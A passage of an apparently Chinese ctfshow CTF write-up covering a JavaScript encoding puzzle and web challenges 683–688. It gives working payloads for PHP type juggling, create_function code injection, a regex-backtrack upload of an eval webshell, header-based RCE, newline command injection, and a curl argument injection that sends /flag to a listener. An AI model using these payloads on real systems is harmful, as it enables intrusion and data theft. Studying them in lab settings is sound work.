keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            n <span class="token operator">=</span> s <span class="token operator">&lt;&lt;</span> <span class="token number">2</span> <span class="token operator">|</span> o <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">;</span>            r <span class="token operator">=</span> <span class="token punctuation">(</span>o <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span> <span class="token operator">|</span> u <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">;</span>            i <span class="token operator">=</span> <span class="token punctuation">(</span>u <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">|</span> a<span class="token punctuation">;</span>            t <span class="token operator">=</span> t <span class="token operator">+</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>u <span class="token operator">!=</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                t <span class="token operator">=</span> t <span class="token operator">+</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                t <span class="token operator">=</span> t <span class="token operator">+</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        t <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">_utf8_decode</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> t    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function-variable function">_utf8_encode</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        e <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">rn</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> e<span class="token punctuation">.</span>length<span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> r <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">></span> <span class="token number">127</span> <span class="token operator">&amp;&amp;</span> r <span class="token operator">&lt;</span> <span class="token number">2048</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">6</span> <span class="token operator">|</span> <span class="token number">192</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">63</span> <span class="token operator">|</span> <span class="token number">128</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">12</span> <span class="token operator">|</span> <span class="token number">224</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">6</span> <span class="token operator">&amp;</span> <span class="token number">63</span> <span class="token operator">|</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">63</span> <span class="token operator">|</span> <span class="token number">128</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> t    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function-variable function">_utf8_decode</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> r <span class="token operator">=</span> c1 <span class="token operator">=</span> c2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> e<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            r <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>                n<span class="token operator">++</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">></span> <span class="token number">191</span> <span class="token operator">&amp;&amp;</span> r <span class="token operator">&lt;</span> <span class="token number">224</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                c2 <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">|</span> c2 <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                n <span class="token operator">+=</span> <span class="token number">2</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                c2 <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                c3 <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c2 <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">|</span> c3 <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                n <span class="token operator">+=</span> <span class="token number">3</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> t    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">st3</span><span class="token punctuation">(</span><span class="token parameter">srcString</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>srcString<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> <span class="token constant">BASE32CHAR</span> <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> digit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> currByte<span class="token punctuation">;</span>    <span class="token keyword">let</span> nextByte<span class="token punctuation">;</span>    <span class="token keyword">let</span> retrunString <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    srcString <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">_utf8_encode</span><span class="token punctuation">(</span>srcString<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> srcString<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        currByte <span class="token operator">=</span> <span class="token punctuation">(</span>srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token operator">:</span> <span class="token punctuation">(</span>srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> srcString<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                nextByte <span class="token operator">=</span> <span class="token punctuation">(</span>srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span>                    <span class="token operator">?</span> srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>                    <span class="token operator">:</span> <span class="token punctuation">(</span>srcString<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                nextByte <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            digit <span class="token operator">=</span> currByte <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">0xFF</span> <span class="token operator">>></span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>            index <span class="token operator">=</span> <span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">;</span>            digit <span class="token operator">&lt;&lt;=</span> index<span class="token punctuation">;</span>            digit <span class="token operator">|=</span> <span class="token punctuation">(</span>nextByte <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            i<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            digit <span class="token operator">=</span> <span class="token punctuation">(</span>currByte <span class="token operator">>></span> <span class="token punctuation">(</span><span class="token number">8</span> <span class="token operator">-</span> <span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">;</span>            index <span class="token operator">=</span> <span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                i<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        retrunString <span class="token operator">=</span> retrunString <span class="token operator">+</span> <span class="token constant">BASE32CHAR</span><span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>digit<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>retrunString<span class="token punctuation">.</span>length <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        retrunString <span class="token operator">+=</span> <span class="token string">"="</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> retrunString<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析代码，要求flag符合下列条件</p><ol><li>前八位为字符串<code>ctfshow&#123;</code>，结尾为<code>&#125;</code></li><li>flag经过sha256运算的结果为<code>e3a331710b01ff3b3e34d5f61c2c9e1393ccba3e31f814e7debd537c97ed7d3d</code></li><li>中间内容长度为36，有4个UUID分块<code>-</code></li><li>c2n函数的作用：将UUID中的内容转换为10进制数</li><li>s2n2su函数的作用：将UUID中每一位的数字相加并返回最终的值</li><li>第一个UUID分段的UUID和值为63</li><li>第一个UUID分段的前四位经过sha256运算后的结果是<code>c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400</code>，结果为<code>592b</code></li><li>第一个UUID分段后4位经过sha256运算后的结果是<code>f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc</code>，结果为<code>9d77</code></li><li>第二个UUID分段是<code>9dda</code></li><li>第三个UUID的第二位是e，并且剩余三位的连接后为430</li><li>第四个UUID为<code>94a4</code></li><li>第五个UUID经过base32编码结果为<code>GVSTMNDGGQ2DSOLBGUZA====</code></li></ol><p>最终构造出flag</p><pre class="line-numbers language-none"><code class="language-none">ctfshow&#123;592b9d77-9dda-4e30-94a4-5e64f4499a52&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>顺便贴个爆破脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> <span class="token operator">*</span>string<span class="token operator">=</span><span class="token string">"0123456789abcdef"</span>k<span class="token operator">=</span>product<span class="token punctuation">(</span>string<span class="token punctuation">,</span>repeat<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> k<span class="token punctuation">:</span>    aaa<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    out1 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>aaa<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>out1<span class="token operator">==</span><span class="token string">'c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>aaa<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>out1<span class="token operator">==</span><span class="token string">'f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>aaa<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>683</strong></p><p>明显的弱类型比较</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'秀'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'秀'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'必须是数字'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'秀'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">30</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'你太短了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'秀'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">30</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'你太长了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'秀'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自动转换时xex会被转换为原始数字，int强制转换string时取到字母停止</p><pre class="line-numbers language-none"><code class="language-none">payload:?秀&#x3D;0.6e7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>684</strong></p><p>源码在此</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arg'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$action</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>变量$action要出现数字字母以外的字符，还要执行函数，使用\create_function，这里利用的是php环境中默认的namespace</p><blockquote><p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 接下来第二个参数可以引发危险的函数。</p></blockquote><blockquote><p>create_function()是PHP中的内置函数，用于在PHP中创建匿名(lambda-style)函数。</p><p><strong>用法:</strong></p><pre class="line-numbers language-none"><code class="language-none">string create_function ( $args, $code )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>参数：</strong>该函数接受以下两个参数：</p><ul><li>**$args:**它是一个字符串类型的函数参数。</li><li>**$code:**它是字符串类型的函数代码。</li></ul><p><strong>注意：</strong>通常，这些参数将作为单引号分隔的字符串传递。使用单引号引起来的字符串的原因是为了防止变量名被解析，否则，将需要双引号来转义变量名，例如\ $avar。</p><p><strong>返回值：</strong>此函数以字符串形式返回唯一的函数名称，否则，在错误时返回FALSE。</p></blockquote><p>而对于create_function函数来说，实际执行的内容如下</p><pre class="line-numbers language-none"><code class="language-none">function noname($args) &#123; $code &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结尾我们使用}闭合，最终的payload如下</p><pre class="line-numbers language-none"><code class="language-none">payload:?action&#x3D;%5ccreate_function&amp;arg&#x3D;&#125;system(&#39;tac &#x2F;secret_you_never_know&#39;);&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>685</strong></p><p>利用正则最大回溯次数绕过</p><blockquote><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过正则表达式了。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://b826efef-6cde-4fa8-84d3-4cb699605ab2.challenge.ctf.show"</span>files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'&lt;?php eval($_POST[1]);?>'</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">1000000</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>686</strong></p><p>无参RCE</p><pre class="line-numbers language-none"><code class="language-none">payload:?code&#x3D;system(current(getallheaders()));X-Forwarded-Host: cat &#x2F;secret_you_never_know<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>687</strong></p><p>换行执行命令</p><pre class="line-numbers language-none"><code class="language-none">payload:?ip&#x3D;1%0atac &#x2F;flaaag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>688</strong></p><p>俩函数一起用有的问题</p><p><code>escapeshellarg(); escapeshellcmd();</code></p><pre class="line-numbers language-none"><code class="language-none">payload:?url&#x3D;http:&#x2F;&#x2F;监听使用的ip:port&#x2F;&#39; -F file&#x3D;@&#x2F;flag&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实际传入shell的是</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> <span class="token string">'http://IP:端口/'</span><span class="token punctuation">\</span><span class="token 